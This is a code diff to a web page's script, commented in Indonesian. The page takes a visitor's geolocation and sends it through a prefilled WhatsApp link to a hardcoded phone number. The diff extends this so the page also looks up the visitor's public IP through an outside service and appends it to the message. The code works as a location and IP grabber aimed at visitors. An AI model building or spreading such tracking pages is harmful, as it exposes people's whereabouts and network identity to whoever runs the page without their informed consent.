@@ -15,11 +15,27 @@
       var latitude = position.coords.latitude;
       var longitude = position.coords.longitude;
       
-      // Redirect ke nomor WhatsApp dengan pesan yang sudah terisi
-      var phoneNumber = '+6281389408798'; // Ganti dengan nomor tujuan WhatsApp Anda
-      var message = '🗿 Lokasi Anda: \n' + latitude + ', ' + longitude;
-      var url = 'https://wa.me/' + phoneNumber + '?text=' + encodeURIComponent(message);
-      window.location.href = url;
+      // Mendapatkan IP address
+      fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+          var ipAddress = data.ip;
+          
+          // Redirect ke nomor WhatsApp dengan pesan yang sudah terisi
+          var phoneNumber = '+6281389408798'; // Ganti dengan nomor tujuan WhatsApp Anda
+          var message = '🗿 Lokasi Anda: \n' + latitude + ', ' + longitude + '\n🌐 IP Address Anda: ' + ipAddress;
+          var url = 'https://wa.me/' + phoneNumber + '?text=' + encodeURIComponent(message);
+          window.location.href = url;
+        })
+        .catch(error => {
+          console.log('Gagal mendapatkan IP address:', error);
+          
+          // Redirect ke nomor WhatsApp tanpa IP address
+          var phoneNumber = '+6281389408798'; // Ganti dengan nomor tujuan WhatsApp Anda
+          var message = '🗿 Lokasi Anda: \n' + latitude + ', ' + longitude;
+          var url = 'https://wa.me/' + phoneNumber + '?text=' + encodeURIComponent(message);
+          window.location.href = url;
+        });
     }
   </script>
 </head>
